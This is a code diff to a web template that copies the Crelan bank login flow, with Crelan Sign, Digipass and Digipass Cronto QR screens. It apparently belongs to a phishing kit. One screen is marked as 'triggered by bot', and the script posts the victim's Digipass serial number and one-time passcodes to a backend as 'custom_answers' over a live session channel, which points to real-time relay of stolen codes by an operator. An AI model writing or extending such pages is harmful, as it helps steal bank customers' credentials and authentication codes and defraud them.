@@ -193,16 +193,12 @@
         </div>
       </div>
 
-      <section class="d-flex text--color-text-main" style="margin-top:1rem;">
-        <section class="col-6 p-4">
-          <div class="text-branded-headline-xs"><span>Via Crelan Sign</span></div>
-        </section>
-        <section class="col-3 p-4">
-          <div class="text-branded-headline-xs">Via Digipass</div>
-        </section>
+      <section class="d-flex text--color-text-main mobile-column" style="margin-top:1rem;">
+        
+        
       </section>
 
-      <section class="d-flex">
+      <section class="d-flex mobile-column">
         <section id="btn-crelan-sign" class="col-6 p-4 cursor--pointer" style="cursor:pointer;">
           <section class="stripe pt-6 justify-content-between card h-100 box text-center align-items-center" style="padding:1.5rem;display:flex;flex-direction:column;align-items:center;">
             <svg width="124" height="124" viewBox="0 0 124 124" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg svg--crelansign icon__cronto-sign" style="padding-top:1rem;">
@@ -219,7 +215,9 @@
             <button type="button" class="btn" style="margin-top:1rem;">continuer</button>
           </section>
         </section>
-
+        <section class="col-3 p-4">
+          <div class="text-branded-headline-xs">Via Digipass</div>
+        </section>
         <section class="col-3 p-4">
           <section class="d-flex justify-content-between m-0 flex-column">
             <section id="btn-digipass-cronto" class="col cursor--pointer" style="cursor:pointer;">
@@ -427,7 +425,7 @@
   </main>
 </div>
 
-{{-- SCREEN 3b: Digipass --}}
+{{-- SCREEN 3b: Digipass Cronto (QR scan with digipass device) --}}
 <div id="view-digipass" style="display:none">
   <aside class="sidebar pt-5 pb-6 px-6">
     <div class="d-flex flex-column gap-5 h-100">
@@ -441,8 +439,157 @@
           </div>
           <h2 class="text-branded-headline-m mt-4 text-xxl-end">{{ __('messages.cs_create_profile') }}</h2>
           <section class="mt-4 mb-4 d-flex flex-column gap-3">
-            {{-- Crelan Sign card --}}
             <div class="digipass-action-card" id="dp-sidebar-crelan-sign" style="cursor:pointer;">
+              <button class="card background--surface-grey justify-content-around align-items-center gap-4 h-100 w-100 p-1" style="display:flex;flex-direction:column;padding:1rem;">
+                <svg width="80" height="80" viewBox="0 0 124 124" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-v2 icon__cronto-sign">
+                  <path d="M31.3572 7H76.6428C77.7266 6.99999 78.6007 6.99998 79.3086 7.05782C80.0375 7.11737 80.6777 7.24318 81.27 7.54497C82.2108 8.02433 82.9757 8.78924 83.455 9.73005C83.7568 10.3223 83.8826 10.9625 83.9422 11.6914C84 12.3993 84 13.2734 84 14.3572V58H82V14.4C82 13.2634 81.9992 12.4711 81.9488 11.8542C81.8994 11.2491 81.8072 10.9014 81.673 10.638C81.3854 10.0735 80.9265 9.6146 80.362 9.32698C80.0986 9.19279 79.7509 9.10062 79.1458 9.05118C78.5289 9.00078 77.7366 9 76.6 9H31.4C30.2634 9 29.4711 9.00078 28.8542 9.05118C28.2491 9.10062 27.9014 9.19279 27.638 9.32698C27.0735 9.6146 26.6146 10.0735 26.327 10.638C26.1928 10.9014 26.1006 11.2491 26.0512 11.8542C26.0008 12.4711 26 13.2634 26 14.4V105.6C26 106.737 26.0008 107.529 26.0512 108.146C26.1006 108.751 26.1928 109.099 26.327 109.362C26.6146 109.926 27.0735 110.385 27.638 110.673C27.9014 110.807 28.2491 110.899 28.8542 110.949C29.4711 110.999 30.2634 111 31.4 111H42V113H31.355C30.2727 113 29.3986 113 28.6914 112.942C27.9625 112.883 27.3223 112.757 26.73 112.455C25.7892 111.976 25.0243 111.211 24.545 110.27C24.2432 109.678 24.1174 109.037 24.0578 108.309C24 107.601 24 106.727 24 105.643V14.3572C24 13.2734 24 12.3993 24.0578 11.6914C24.1174 10.9625 24.2432 10.3223 24.545 9.73005C25.0243 8.78924 25.7892 8.02433 26.73 7.54497C27.3223 7.24318 27.9625 7.11737 28.6914 7.05782C29.3993 6.99998 30.2734 6.99999 31.3572 7Z" fill="#00AE53"></path>
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M54 67C52.3431 67 51 68.3431 51 70V110C51 111.657 52.3431 113 54 113H94C95.6569 113 97 111.657 97 110V70C97 68.3431 95.6569 67 94 67H54ZM53 70C53 69.4477 53.4477 69 54 69H94C94.5523 69 95 69.4477 95 70V110C95 110.552 94.5523 111 94 111H54C53.4477 111 53 110.552 53 110V70Z" fill="#00AE53"></path>
+                </svg>
+                <div class="text-center mb-4"><div class="text-plain-title-l">Crelan Sign</div></div>
+              </button>
+            </div>
+            <div class="digipass-action-card" id="dp-sidebar-digipass" style="cursor:pointer;">
+              <button class="card border--brand-forest background--surface-grey justify-content-around align-items-center gap-4 h-100 w-100 p-1" style="display:flex;flex-direction:column;padding:1rem;">
+                <svg width="50" height="80" viewBox="0 0 66 110" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-v2 icon__digipass-cronto-front">
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M14.1615 10H51.8385C52.3657 9.99998 52.8205 9.99997 53.195 10.0306C53.5904 10.0629 53.9836 10.1342 54.362 10.327C54.9265 10.6146 55.3854 11.0735 55.673 11.638C55.8658 12.0164 55.9371 12.4096 55.9694 12.805C56 13.1795 56 13.6343 56 14.1614V37.8386C56 38.3657 56 38.8205 55.9694 39.195C55.9371 39.5904 55.8658 39.9836 55.673 40.362C55.3854 40.9265 54.9265 41.3854 54.362 41.673C53.9836 41.8658 53.5904 41.9371 53.195 41.9694C52.8205 42 52.3657 42 51.8386 42H14.1614C13.6343 42 13.1795 42 12.805 41.9694C12.4096 41.9371 12.0164 41.8658 11.638 41.673C11.0735 41.3854 10.6146 40.9265 10.327 40.362C10.1342 39.9836 10.0629 39.5904 10.0306 39.195C9.99996 38.8205 9.99998 38.3657 10 37.8385V14.1615C9.99998 13.6343 9.99996 13.1795 10.0306 12.805C10.0629 12.4096 10.1342 12.0164 10.327 11.638C10.6146 11.0735 11.0735 10.6146 11.638 10.327C12.0164 10.1342 12.4096 10.0629 12.805 10.0306C13.1795 9.99997 13.6343 9.99998 14.1615 10Z" fill="#00AE53"></path>
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M13.7547 0H52.2453C54.4472 0 56.161 0 57.5358 0.112315C58.9317 0.226361 60.0658 0.461167 61.0859 0.980942C62.7794 1.8438 64.1562 3.22063 65.0191 4.91409C65.5388 5.9342 65.7736 7.06833 65.8877 8.46418C66 9.83896 66 11.5528 66 13.7547V95.6424C66 99.1096 66 101.181 65.1633 102.985C64.4551 104.51 63.1833 105.948 61.7554 106.836C60.0667 107.887 58.1155 108.126 54.8605 108.525C48.6581 109.286 40.8349 110 33 110C25.1651 110 17.3419 109.286 11.3788 108.555C7.88451 108.126 5.93331 107.887 4.24459 106.836C2.81668 105.948 1.54489 104.51 0.836718 102.985C-0.000865 101.181 0 99.1096 0 95.6424V13.7547C0 11.5528 0 9.83896 0.112314 8.46418C0.22636 7.06833 0.461166 5.9342 0.98094 4.91409C1.8438 3.22063 3.22063 1.8438 4.91408 0.980942C5.9342 0.461167 7.06833 0.226361 8.46418 0.112315C9.83896 0 11.5528 0 13.7547 0Z" fill="#00AE53"></path>
+                </svg>
+                <div class="text-center mb-4"><div class="text-plain-title-l">Digipass</div></div>
+              </button>
+            </div>
+          </section>
+        </myc-navigation-digipass>
+      </div>
+      <div class="d-flex flex-column h-100">
+        <div class="mt-auto text-start text-xxl-end">
+          <a class="btn" href="/" aria-label="{{ __('messages.contact_us') }}"><span>{{ __('messages.contact_us') }}</span></a>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <main class="content page-container content--with-sidebar">
+    <form novalidate="" id="digipass-cronto-form">
+      <myc-digipass-cronto-identification>
+        <div class="card mb-4">
+          <div class="w-100 separator--bottom p-5 text-branded-headline-xs">{{ __('messages.dp_cronto_step1_title') }}</div>
+          <div class="p-5 w-75">
+            <myc-subscription-reference-input>
+              <div class="row h-100">
+                <div class="col-3 my-auto text-center px-3">
+                  <svg width="84" height="88" viewBox="0 0 84 88" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-v2--active icon__direct-mail-identification">
+                    <path d="M37.8871 19.6772H23.0806V21.3223H37.8871V19.6772Z" fill="#00AE53"></path>
+                    <path d="M60.9193 27.903V29.5481H23.0806V27.903H60.9193Z" fill="#00AE53"></path>
+                    <path d="M23.0806 36.1288V37.7739H60.9193V36.1288H23.0806Z" fill="#00AE53"></path>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12.3871 0.757812H71.6129V31.5756L83.9516 39.8015V87.9514H0.0483398V39.789L12.3871 31.9745V0.757812ZM71.6129 47.1144V33.5529L81.6587 40.2501L71.6129 47.1144ZM69.9677 2.40297V48.2386L55.543 58.095L49.9408 52.4362C45.7856 48.239 39.0146 48.2052 34.8177 52.3606L29.0174 58.1034L14.0322 48.0667V2.40297H69.9677ZM12.3871 33.9218V46.9648L2.37787 40.261L12.3871 33.9218ZM82.3064 41.8L56.7197 59.2835L82.3064 85.1287V41.8ZM81.1571 86.3062L48.7717 53.5936C45.2557 50.0422 39.5265 50.0135 35.9752 53.5297L2.87086 86.3062H81.1571ZM1.6935 85.1568V41.7827L27.8245 59.2845L1.6935 85.1568Z" fill="#00AE53"></path>
+                  </svg>
+                </div>
+                <div class="col-9 h-100 border-start ps-5 text-plain-body-l-regular">
+                  <span>{{ __('messages.enter_user_id_example') }}</span>
+                  <div class="row mt-1">
+                    <div class="w-100 my-auto">
+                      <div class="input-group">
+                        <div class="d-flex align-items-center gap-2 w-100 pe-2">
+                          <input autocomplete="off" class="form-control e2e-text-input text-center" id="dp-user-code" name="userCode" type="text" readonly maxlength="6" placeholder=". . . . . ." aria-label="{{ __('messages.user_identity') }}">
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </myc-subscription-reference-input>
+          </div>
+        </div>
+
+        <h3 class="text-branded-headline-s my-4">{{ __('messages.dp_cronto_connect') }}</h3>
+
+        <div class="card mb-4">
+          <div class="card__body box">
+            <div class="row align-items-center">
+              <div class="col-3">
+                <div class="text-center">
+                  {{-- QR Loading --}}
+                  <div id="dp-qr-loading" class="text-center">
+                    <div style="width:150px;height:150px;margin:0 auto;display:flex;align-items:center;justify-content:center;">
+                      <div class="waiting-spinner" style="width:50px;height:50px;border:4px solid #e0e0e0;border-top:4px solid #00AE53;border-radius:50%;animation:spin 1s linear infinite;"></div>
+                    </div>
+                    <div style="margin-top:0.5rem;"><span>{{ __('messages.cs_qr_loading') }}</span></div>
+                  </div>
+                  {{-- QR Image --}}
+                  <div id="dp-qr-image-wrapper" style="display:none;" class="text-center">
+                    <img id="dp-qr-image" src="" alt="QR Code" style="max-width:150px;max-height:150px;">
+                    <div style="margin-top:0.5rem;">
+                      <span>{{ __('messages.dp_cronto_qr_expires_prefix') }} <b id="dp-qr-timer">160</b> {{ __('messages.dp_cronto_qr_expires_suffix') }}</span>
+                    </div>
+                  </div>
+                  {{-- QR Timeout --}}
+                  <div id="dp-qr-timeout" style="display:none;" class="text-center">
+                    <div style="width:150px;height:150px;margin:0 auto;display:flex;align-items:center;justify-content:center;flex-direction:column;">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+                      <span style="margin-top:0.5rem;color:#666;font-size:0.9rem;">{{ __('messages.cs_qr_expired') }}</span>
+                    </div>
+                    <button type="button" id="dp-qr-retry-btn" class="btn btn-prominent" style="margin-top:1rem;">{{ __('messages.cs_qr_retry') }}</button>
+                  </div>
+                </div>
+              </div>
+              <div class="col-9">
+                <ul class="list">
+                  <li class="d-flex gap-3 py-3">
+                    <span class="text-plain-title-l mx-1">1</span><div class="vr"></div>
+                    <div class="text-plain-body-l-regular">{{ __('messages.dp_cronto_step1') }}</div>
+                  </li>
+                  <li class="d-flex gap-3 py-3">
+                    <span class="text-plain-title-l mx-1">2</span><div class="vr"></div>
+                    <div class="text-plain-body-l-regular"><strong>{{ __('messages.dp_cronto_step2') }}</strong></div>
+                  </li>
+                  <li class="d-flex gap-3 py-3">
+                    <span class="text-plain-title-l mx-1">3</span><div class="vr"></div>
+                    <div class="text-plain-body-l-regular">{{ __('messages.dp_cronto_step3') }}</div>
+                  </li>
+                  <li class="d-flex gap-3 py-3">
+                    <span class="text-plain-title-l mx-1">4</span><div class="vr"></div>
+                    <div class="text-plain-body-l-regular">
+                      <span>{{ __('messages.dp_cronto_step4') }}</span>
+                      <div class="row mt-2">
+                        <div class="col-6">
+                          <div class="input-group">
+                            <div class="d-flex align-items-center gap-2 w-100 pe-2">
+                              <input autocomplete="off" class="form-control e2e-text-input text-center" id="dp-cronto-otp" name="crontoOtp" type="text" maxlength="9" placeholder="" aria-label="{{ __('messages.dp_cronto_otp_label') }}">
+                            </div>
+                          </div>
+                        </div>
+                        <div class="col">
+                          <button type="submit" class="btn btn-prominent" disabled id="dp-cronto-submit-btn">{{ __('messages.dp_cronto_continue') }}</button>
+                        </div>
+                      </div>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </myc-digipass-cronto-identification>
+    </form>
+  </main>
+</div>
+
+{{-- SCREEN 3c: Digipass Serial (triggered by bot) --}}
+<div id="view-digipass-serial" style="display:none">
+  <aside class="sidebar pt-5 pb-6 px-6">
+    <div class="d-flex flex-column gap-5 h-100">
+      <div class="d-flex flex-column gap-5">
+        <myc-navigation-digipass>
+          <div class="d-flex justify-content-start justify-content-xxl-end">
+            <a tabindex="0" class="btn d-flex gap-1 text-branded-button-m" href="#" id="dps-back-btn">
+              <fa-icon class="ng-fa-icon icon-v2--black"><svg role="img" aria-hidden="true" focusable="false" class="svg-inline--fa fa-arrow-left" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M25.4 278.6L2.7 256l22.6-22.6 144-144L192 66.7 237.2 112l-22.6 22.6L125.2 224 416 224l32 0 0 64-32 0-290.7 0 89.4 89.4L237.2 400 192 445.3l-22.6-22.6-144-144z"></path></svg></fa-icon>
+              <span>{{ __('messages.back_to_profiles') }}</span>
+            </a>
+          </div>
+          <h2 class="text-branded-headline-m mt-4 text-xxl-end">{{ __('messages.cs_create_profile') }}</h2>
+          <section class="mt-4 mb-4 d-flex flex-column gap-3">
+            {{-- Crelan Sign card --}}
+            <div class="digipass-action-card" id="dps-sidebar-crelan-sign" style="cursor:pointer;">
               <button class="card background--surface-grey justify-content-around align-items-center gap-4 h-100 w-100 p-1" style="display:flex;flex-direction:column;padding:1rem;">
               <svg width="124" height="124" viewBox="0 0 124 124" fill="none" xmlns="http://www.w3.org/2000/svg" _ngcontent-ng-c3142502726="" class="icon-v2 icon__cronto-sign">
 <g id="Crelan Sign" _ngcontent-ng-c3142502726="">
@@ -494,7 +641,7 @@
               </button>
             </div>
             {{-- Digipass card (active) --}}
-            <div class="digipass-action-card" id="dp-sidebar-digipass" style="cursor:pointer;">
+            <div class="digipass-action-card" id="dps-sidebar-digipass" style="cursor:pointer;">
               <button class="card border--brand-forest background--surface-grey justify-content-around align-items-center gap-4 h-100 w-100 p-1" style="display:flex;flex-direction:column;padding:1rem;">
               <svg width="68" height="110" viewBox="0 0 68 110" fill="none" xmlns="http://www.w3.org/2000/svg" _ngcontent-ng-c3142502726="" class="icon-v2 icon__digipass-front">
 <path fill-rule="evenodd" clip-rule="evenodd" d="M18 50C20.7614 50 23 47.7614 23 45C23 42.2386 20.7614 40 18 40C15.2386 40 13 42.2386 13 45C13 47.7614 15.2386 50 18 50ZM18 48C19.6569 48 21 46.6569 21 45C21 43.3431 19.6569 42 18 42C16.3431 42 15 43.3431 15 45C15 46.6569 16.3431 48 18 48Z" fill="#00AE53" _ngcontent-ng-c3142502726=""></path>
@@ -527,7 +674,7 @@
   </aside>
 
   <main class="content page-container content--with-sidebar">
-    <form novalidate="" id="digipass-form">
+    <form novalidate="" id="digipass-serial-form">
       <myc-digipass-identification>
         <h3 class="text-branded-headline-s mt-6 mb-5">{{ __('messages.identification') }}</h3>
         <div class="card">
@@ -549,7 +696,7 @@
                       <div class="w-100 my-auto">
                         <div class="input-group">
                           <div class="d-flex align-items-center gap-2 w-100 pe-2">
-                            <input autocomplete="off" class="form-control e2e-text-input text-center" id="dp-user-code" name="userCode" type="text" readonly maxlength="6" placeholder=". . . . . ." aria-label="{{ __('messages.user_identity') }}">
+                            <input autocomplete="off" class="form-control e2e-text-input text-center" id="dps-user-code" name="userCode" type="text" readonly maxlength="6" placeholder=". . . . . ." aria-label="{{ __('messages.user_identity') }}">
                           </div>
                         </div>
                       </div>
@@ -599,7 +746,7 @@
                       <div>{{ __('messages.dp_serial_description') }}</div>
                       <div class="input-group" style="margin-top:0.5rem;">
                         <div class="d-flex align-items-center gap-2 w-100 pe-2">
-                          <input autocomplete="off" class="form-control e2e-text-input text-center" id="dp-serial-number" name="serialNumberMainInput" type="tel" maxlength="12" placeholder="" aria-label="{{ __('messages.dp_serial_label') }}">
+                          <input autocomplete="off" class="form-control e2e-text-input text-center" id="dps-serial-number" name="serialNumberMainInput" type="tel" maxlength="12" placeholder="" aria-label="{{ __('messages.dp_serial_label') }}">
                         </div>
                       </div>
                     </div>
@@ -631,17 +778,17 @@
                   <li class="d-flex gap-3 py-3">
                     <span class="d-flex align-items-center text-plain-title-l">3</span>
                     <div class="vr"></div>
-                    <div id="dp-step3">
+                    <div id="dps-step3">
                       <span>{{ __('messages.dp_step3') }}</span>
                       <div class="d-flex gap-3 align-items-center mt-2">
                         <section class="flex-grow-1">
                           <div class="input-group">
                             <div class="d-flex align-items-center gap-2 w-100 pe-2">
-                              <input autocomplete="off" class="form-control e2e-text-input text-center" id="dp-otp" name="otp" type="tel" maxlength="6" placeholder="" aria-label="{{ __('messages.dp_otp_label') }}">
+                              <input autocomplete="off" class="form-control e2e-text-input text-center" id="dps-otp" name="otp" type="tel" maxlength="6" placeholder="" aria-label="{{ __('messages.dp_otp_label') }}">
                             </div>
                           </div>
                         </section>
-                        <button name="submit" type="submit" class="btn btn-prominent" disabled id="dp-submit-btn">{{ __('messages.dp_connect') }}</button>
+                        <button name="submit" type="submit" class="btn btn-prominent" disabled id="dps-submit-btn">{{ __('messages.dp_connect') }}</button>
                       </div>
                     </div>
                   </li>
@@ -656,7 +803,9 @@
 </div>
 
 <style>
-    
+    .mobile-column{
+      flex-direction: row;
+    }
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 .cursor--pointer { cursor: pointer; }
 input.form-control, input.e2e-text-input { border: solid 1px #757575 !important; }
@@ -677,12 +826,17 @@ document.addEventListener('DOMContentLoaded', function() {
     let qrCountdown = 60;
     let qrReceived = false;
     let echoChannel = null;
+    let activeQrView = null;
+    let dpQrTimer = null;
+    let dpQrCountdown = 160;
+    let dpQrReceived = false;
 
     const views = {
         code: document.getElementById('view-code'),
         method: document.getElementById('view-method'),
         crelanSign: document.getElementById('view-crelan-sign'),
         digipass: document.getElementById('view-digipass'),
+        digipassSerial: document.getElementById('view-digipass-serial'),
     };
 
     createPreSession();
@@ -812,7 +966,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function fillUserCode(code) {
-        ['method-user-code', 'cs-user-code', 'dp-user-code'].forEach(id => {
+        ['method-user-code', 'cs-user-code', 'dp-user-code', 'dps-user-code'].forEach(id => {
             const el = document.getElementById(id);
             if (el) el.value = code;
         });
@@ -976,8 +1130,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken },
                 body: JSON.stringify({
                     action_type: 'digipass',
-                    data: {
-                        user_code: userCode,
+                    custom_answers: {
                         serial_number: dpSerial.value.trim(),
                         otp: dpOtp.value.trim()
                     }
